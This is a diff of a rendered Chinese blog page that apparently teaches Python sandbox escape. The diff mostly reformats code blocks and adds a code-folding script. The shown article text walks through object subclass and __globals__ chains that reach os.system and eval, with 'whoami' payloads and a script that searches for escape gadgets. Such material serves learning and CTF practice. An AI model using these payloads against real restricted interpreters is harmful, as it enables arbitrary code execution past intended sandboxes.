-</span><span class="lnt">56
-</span><span class="lnt">57
-</span><span class="lnt">58
-</span><span class="lnt">59
-</span><span class="lnt">60
-</span><span class="lnt">61
-</span><span class="lnt">62
-</span><span class="lnt">63
-</span><span class="lnt">64
-</span><span class="lnt">65
-</span><span class="lnt">66
-</span><span class="lnt">67
-</span><span class="lnt">68
-</span><span class="lnt">69
-</span><span class="lnt">70
-</span><span class="lnt">71
-</span><span class="lnt">72
-</span><span class="lnt">73
-</span><span class="lnt">74
-</span><span class="lnt">75
-</span><span class="lnt">76
-</span><span class="lnt">77
-</span><span class="lnt">78
-</span><span class="lnt">79
-</span><span class="lnt">80
-</span><span class="lnt">81
-</span><span class="lnt">82
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">python</span>
+</span></span></code></pre></div><p>还有，既然所有的类都继承的object，那么我们先用__subclasses__看看它的子类，以 2.x 为例：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">python</span>
 </span></span><span class="line"><span class="cl"><span class="mi">2</span><span class="o">&gt;&gt;&gt;</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">enumerate</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">__class__</span><span class="o">.</span><span class="n">__mro__</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()):</span> <span class="nb">print</span> <span class="n">i</span>
 </span></span><span class="line"><span class="cl"><span class="o">...</span>
 </span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&lt;</span><span class="n">type</span> <span class="s1">&#39;type&#39;</span><span class="o">&gt;</span><span class="p">)</span>
@@ -938,38 +618,12 @@
 </span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">76</span><span class="p">,</span> <span class="o">&lt;</span><span class="k">class</span> <span class="s1">&#39;site.Quitter&#39;</span><span class="o">&gt;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">77</span><span class="p">,</span> <span class="o">&lt;</span><span class="k">class</span> <span class="s1">&#39;codecs.IncrementalEncoder&#39;</span><span class="o">&gt;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">78</span><span class="p">,</span> <span class="o">&lt;</span><span class="k">class</span> <span class="s1">&#39;codecs.IncrementalDecoder&#39;</span><span class="o">&gt;</span><span class="p">)</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>可以看到，site 就在里面，以 2.x 的 site._Printer 为例：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&gt;&gt;&gt; &#39;&#39;.__class__.__mro__[-1].__subclasses__()[71]._Printer__setup.__globals__[&#39;os&#39;]
+</span></span></code></pre></div><p>可以看到，site 就在里面，以 2.x 的 site._Printer 为例：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&gt;&gt;&gt; &#39;&#39;.__class__.__mro__[-1].__subclasses__()[71]._Printer__setup.__globals__[&#39;os&#39;]
 </span></span><span class="line"><span class="cl">&lt;module &#39;os&#39; from &#39;/Users/macr0phag3/.pyenv/versions/2.7.15/lib/python2.7/os.pyc&#39;&gt; 
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>os 又回来了。并且 site 中还有 <strong>builtins</strong>。</p>
+</span></span></code></pre></div><p>os 又回来了。并且 site 中还有 <strong>builtins</strong>。</p>
 <p>这个方法不仅限于 A-&gt;os，还阔以是 A-&gt;B-&gt;os，比如 2.x 中的 warnings：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&gt;&gt;&gt; import warnings
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&gt;&gt;&gt; import warnings
 </span></span><span class="line"><span class="cl">&gt;&gt;&gt; 
 </span></span><span class="line"><span class="cl">&gt;&gt;&gt; warnings.os
 </span></span><span class="line"><span class="cl">Traceback (most recent call last):
@@ -981,78 +635,26 @@
 </span></span><span class="line"><span class="cl">&gt;&gt;&gt;
 </span></span><span class="line"><span class="cl">&gt;&gt;&gt; warnings.linecache.os
 </span></span><span class="line"><span class="cl">&lt;module &#39;os&#39; from &#39;/Users/macr0phag3/.pyenv/versions/2.7.15/lib/python2.7/os.pyc&#39;&gt;
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>在继承链中就可以这样：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__[&#39;os&#39;].system(&#39;whoami&#39;)
+</span></span></code></pre></div><p>在继承链中就可以这样：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__[&#39;os&#39;].system(&#39;whoami&#39;)
 </span></span><span class="line"><span class="cl">macr0phag3
 </span></span><span class="line"><span class="cl">0
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>顺便说一下，warnings这个库中有个函数：warnings.catch_warnings，它有个_module属性：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">    def __init__(self, record=False, module=None):
+</span></span></code></pre></div><p>顺便说一下，warnings这个库中有个函数：warnings.catch_warnings，它有个_module属性：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">    def __init__(self, record=False, module=None):
 </span></span><span class="line"><span class="cl">...
 </span></span><span class="line"><span class="cl">        self._module = sys.modules[&#39;warnings&#39;] if module is None else module
 </span></span><span class="line"><span class="cl">...
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>所以通过_module也可以构造 payload：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&gt;&gt;&gt; [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == &#39;catch_warnings&#39;][0]()._module.linecache.os.system(&#39;whoami&#39;)
+</span></span></code></pre></div><p>所以通过_module也可以构造 payload：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&gt;&gt;&gt; [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == &#39;catch_warnings&#39;][0]()._module.linecache.os.system(&#39;whoami&#39;)
 </span></span><span class="line"><span class="cl">macr0phag3
 </span></span><span class="line"><span class="cl">0
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>3.x 中的warnings虽然没有 linecache，也有__builtins__。</p>
+</span></span></code></pre></div><p>3.x 中的warnings虽然没有 linecache，也有__builtins__。</p>
 <p>同样，py3.x 中有<code>&lt;class 'os._wrap_close'&gt;</code>，利用方式可以为：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&gt;&gt;&gt; &#39;&#39;.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__[&#39;system&#39;](&#39;whoami&#39;)
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&gt;&gt;&gt; &#39;&#39;.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__[&#39;system&#39;](&#39;whoami&#39;)
 </span></span><span class="line"><span class="cl">macr0phag3
 </span></span><span class="line"><span class="cl">0
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>顺便提一下，object 本来就是可以使用的，如果没过滤这个变量的话，payload 可以简化为：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span><span class="lnt">8
-</span><span class="lnt">9
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">object.__subclasses__()[117].__init__.__globals__[&#39;system&#39;](&#39;whoami&#39;)
+</span></span></code></pre></div><p>顺便提一下，object 本来就是可以使用的，如果没过滤这个变量的话，payload 可以简化为：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">object.__subclasses__()[117].__init__.__globals__[&#39;system&#39;](&#39;whoami&#39;)
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">还有一种是利用builtin_function_or_method 的 __call__：
 </span></span><span class="line"><span class="cl">
@@ -1061,186 +663,17 @@
 </span></span><span class="line"><span class="cl">或者简单一点：
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">[].__getattribute__(&#39;append&#39;).__class__.__call__(eval, &#39;1+1&#39;)
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>还可以这样利用：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">class test(dict):
+</span></span></code></pre></div><p>还可以这样利用：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">class test(dict):
 </span></span><span class="line"><span class="cl">    def __init__(self):
 </span></span><span class="line"><span class="cl">        print(super(test, self).keys.__class__.__call__(eval, &#39;1+1&#39;))
 </span></span><span class="line"><span class="cl">        # 如果是 3.x 的话可以简写为：
 </span></span><span class="line"><span class="cl">        # super().keys.__class__.__call__(eval, &#39;1+1&#39;))
 </span></span><span class="line"><span class="cl">test()
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>上面的这些利用方式总结起来就是通过<code>__class__</code>、<code>__mro__</code>、<code>__subclasses__</code>、<code>__bases__</code>等等属性/方法去获取 object，再根据<code>__globals__</code>找引入的<code>__builtins__</code>或者 eval 等等能够直接被利用的库，或者找到<code>builtin_function_or_method</code>类/类型<code>__call__</code>后直接运行 eval 。</p>
+</span></span></code></pre></div><p>上面的这些利用方式总结起来就是通过<code>__class__</code>、<code>__mro__</code>、<code>__subclasses__</code>、<code>__bases__</code>等等属性/方法去获取 object，再根据<code>__globals__</code>找引入的<code>__builtins__</code>或者 eval 等等能够直接被利用的库，或者找到<code>builtin_function_or_method</code>类/类型<code>__call__</code>后直接运行 eval 。</p>
 <h3 id="3遍历获取逃逸方法">3.遍历获取逃逸方法
 </h3><p>Python 3</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">  1
-</span><span class="lnt">  2
-</span><span class="lnt">  3
-</span><span class="lnt">  4
-</span><span class="lnt">  5
-</span><span class="lnt">  6
-</span><span class="lnt">  7
-</span><span class="lnt">  8
-</span><span class="lnt">  9
-</span><span class="lnt"> 10
-</span><span class="lnt"> 11
-</span><span class="lnt"> 12
-</span><span class="lnt"> 13
-</span><span class="lnt"> 14
-</span><span class="lnt"> 15
-</span><span class="lnt"> 16
-</span><span class="lnt"> 17
-</span><span class="lnt"> 18
-</span><span class="lnt"> 19
-</span><span class="lnt"> 20
-</span><span class="lnt"> 21
-</span><span class="lnt"> 22
-</span><span class="lnt"> 23
-</span><span class="lnt"> 24
-</span><span class="lnt"> 25
-</span><span class="lnt"> 26
-</span><span class="lnt"> 27
-</span><span class="lnt"> 28
-</span><span class="lnt"> 29
-</span><span class="lnt"> 30
-</span><span class="lnt"> 31
-</span><span class="lnt"> 32
-</span><span class="lnt"> 33
-</span><span class="lnt"> 34
-</span><span class="lnt"> 35
-</span><span class="lnt"> 36
-</span><span class="lnt"> 37
-</span><span class="lnt"> 38
-</span><span class="lnt"> 39
-</span><span class="lnt"> 40
-</span><span class="lnt"> 41
-</span><span class="lnt"> 42
-</span><span class="lnt"> 43
-</span><span class="lnt"> 44
-</span><span class="lnt"> 45
-</span><span class="lnt"> 46
-</span><span class="lnt"> 47
-</span><span class="lnt"> 48
-</span><span class="lnt"> 49
-</span><span class="lnt"> 50
-</span><span class="lnt"> 51
-</span><span class="lnt"> 52
-</span><span class="lnt"> 53
-</span><span class="lnt"> 54
-</span><span class="lnt"> 55
-</span><span class="lnt"> 56
-</span><span class="lnt"> 57
-</span><span class="lnt"> 58
-</span><span class="lnt"> 59
-</span><span class="lnt"> 60
-</span><span class="lnt"> 61
-</span><span class="lnt"> 62
-</span><span class="lnt"> 63
-</span><span class="lnt"> 64
-</span><span class="lnt"> 65
-</span><span class="lnt"> 66
-</span><span class="lnt"> 67
-</span><span class="lnt"> 68
-</span><span class="lnt"> 69
-</span><span class="lnt"> 70
-</span><span class="lnt"> 71
-</span><span class="lnt"> 72
-</span><span class="lnt"> 73
-</span><span class="lnt"> 74
-</span><span class="lnt"> 75
-</span><span class="lnt"> 76
-</span><span class="lnt"> 77
-</span><span class="lnt"> 78
-</span><span class="lnt"> 79
-</span><span class="lnt"> 80
-</span><span class="lnt"> 81
-</span><span class="lnt"> 82
-</span><span class="lnt"> 83
-</span><span class="lnt"> 84
-</span><span class="lnt"> 85
-</span><span class="lnt"> 86
-</span><span class="lnt"> 87
-</span><span class="lnt"> 88
-</span><span class="lnt"> 89
-</span><span class="lnt"> 90
-</span><span class="lnt"> 91
-</span><span class="lnt"> 92
-</span><span class="lnt"> 93
-</span><span class="lnt"> 94
-</span><span class="lnt"> 95
-</span><span class="lnt"> 96
-</span><span class="lnt"> 97
-</span><span class="lnt"> 98
-</span><span class="lnt"> 99
-</span><span class="lnt">100
-</span><span class="lnt">101
-</span><span class="lnt">102
-</span><span class="lnt">103
-</span><span class="lnt">104
-</span><span class="lnt">105
-</span><span class="lnt">106
-</span><span class="lnt">107
-</span><span class="lnt">108
-</span><span class="lnt">109
-</span><span class="lnt">110
-</span><span class="lnt">111
-</span><span class="lnt">112
-</span><span class="lnt">113
-</span><span class="lnt">114
-</span><span class="lnt">115
-</span><span class="lnt">116
-</span><span class="lnt">117
-</span><span class="lnt">118
-</span><span class="lnt">119
-</span><span class="lnt">120
-</span><span class="lnt">121
-</span><span class="lnt">122
-</span><span class="lnt">123
-</span><span class="lnt">124
-</span><span class="lnt">125
-</span><span class="lnt">126
-</span><span class="lnt">127
-</span><span class="lnt">128
-</span><span class="lnt">129
-</span><span class="lnt">130
-</span><span class="lnt">131
-</span><span class="lnt">132
-</span><span class="lnt">133
-</span><span class="lnt">134
-</span><span class="lnt">135
-</span><span class="lnt">136
-</span><span class="lnt">137
-</span><span class="lnt">138
-</span><span class="lnt">139
-</span><span class="lnt">140
-</span><span class="lnt">141
-</span><span class="lnt">142
-</span><span class="lnt">143
-</span><span class="lnt">144
-</span><span class="lnt">145
-</span><span class="lnt">146
-</span><span class="lnt">147
-</span><span class="lnt">148
-</span><span class="lnt">149
-</span><span class="lnt">150
-</span><span class="lnt">151
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">python</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">python</span>
 </span></span><span class="line"><span class="cl"><span class="c1"># coding=utf-8</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">find_modules</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;asyncio&#39;</span><span class="p">:</span> <span class="p">[</span><span class="s1">&#39;subprocess&#39;</span><span class="p">,</span> <span class="s1">&#39;sys&#39;</span><span class="p">,</span> <span class="s1">&#39;__builtins__&#39;</span><span class="p">],</span> <span class="s1">&#39;collections&#39;</span><span class="p">:</span> <span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">],</span>
@@ -1391,9 +824,7 @@
 </span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">f</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">    <span class="n">except</span> <span class="n">Exception</span> <span class="n">as</span> <span class="n">e</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl">        <span class="k">pass</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>参考：</p>
+</span></span></code></pre></div><p>参考：</p>
 <blockquote>
 <p><a class="link" href="https://www.cnblogs.com/conscience-remain/p/16991530.html"  target="_blank" rel="noopener"
     >一文看懂Python沙箱逃逸</a></p></blockquote>
@@ -1621,6 +1052,51 @@
         document.head.appendChild(customFont);
     }());
 </script>
+  <script>
+    (function () {
+      const maxHeight = 420;
 
+      function initCodeFold() {
+        document
+          .querySelectorAll(".article-content .highlight")
+          .forEach(function (block) {
+            if (block.dataset.codeFoldInit === "true") return;
+
+            block.dataset.codeFoldInit = "true";
+
+            if (block.scrollHeight <= maxHeight + 40) return;
+
+            const wrapper = document.createElement("div");
+            wrapper.className = "code-fold-wrapper";
+
+            block.parentNode.insertBefore(wrapper, block);
+            wrapper.appendChild(block);
+
+            block.classList.add("code-collapsible", "code-collapsed");
+
+            const button = document.createElement("button");
+            button.type = "button";
+            button.className = "code-toggle-button";
+            button.textContent = "展开代码";
+            button.setAttribute("aria-expanded", "false");
+
+            button.addEventListener("click", function () {
+              const collapsed = block.classList.toggle("code-collapsed");
+
+              button.textContent = collapsed ? "展开代码" : "收起代码";
+              button.setAttribute("aria-expanded", String(!collapsed));
+            });
+
+            wrapper.appendChild(button);
+          });
+      }
+
+      if (document.readyState === "loading") {
+        document.addEventListener("DOMContentLoaded", initCodeFold);
+      } else {
+        initCodeFold();
+      }
+    })();
+  </script>
     </body>
 </html>
